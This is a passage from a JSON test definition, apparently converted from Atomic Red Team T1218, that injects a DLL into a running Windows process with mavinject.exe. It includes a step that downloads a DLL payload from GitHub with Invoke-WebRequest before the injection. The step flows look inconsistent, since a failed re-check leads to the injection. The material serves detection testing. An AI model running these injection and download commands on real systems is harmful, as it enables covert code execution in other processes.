{
  "id": "c426dacf-575d-4937-8611-a148a86a5e61",
  "name": "mavinject - Inject DLL into running process",
  "description": "Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "bf48a6b4-ab17-4293-8783-d18bfc19d178",
      "type": "execute-command",
      "data": {
        "command": "mavinject.exe #{process_id} /INJECTRUNNING \"#{dll_payload}\"\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "7156416b-2bd3-4e46-8ebb-89b54a545ccb",
      "name": "Check dependency 1/1",
      "description": "T1218.dll must exist on disk at specified location (#{dll_payload})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "3a9222e7-9a3f-4b4b-a8b5-dc6f0b3f79e2",
      "name": "Resolve dependency 1/1",
      "description": "T1218.dll must exist on disk at specified location (#{dll_payload})\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll\" -OutFile \"#{dll_payload}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "1dc4f7a6-c4c1-438a-bb6f-911e061038aa",
      "name": "Re-check dependency 1/1",
      "description": "T1218.dll must exist on disk at specified location (#{dll_payload})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "7156416b-2bd3-4e46-8ebb-89b54a545ccb",
      "p": "on-success",
      "o": "bf48a6b4-ab17-4293-8783-d18bfc19d178"
    },
    {
      "s": "7156416b-2bd3-4e46-8ebb-89b54a545ccb",
      "p": "on-failure",
      "o": "3a9222e7-9a3f-4b4b-a8b5-dc6f0b3f79e2"
    },
    {
      "s": "3a9222e7-9a3f-4b4b-a8b5-dc6f0b3f79e2",
      "p": "on-success",
      "o": "1dc4f7a6-c4c1-438a-bb6f-911e061038aa"
    },
    {
      "s": "1dc4f7a6-c4c1-438a-bb6f-911e061038aa",
      "p": "on-failure",
      "o": "bf48a6b4-ab17-4293-8783-d18bfc19d178"
    }
  ],
  "tags": [
    "T1218",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "process_id",
      "type": "string",
      "description": "PID of process receiving injection",
      "value": "1000"
    },
    {
      "name": "dll_payload",
      "type": "path",
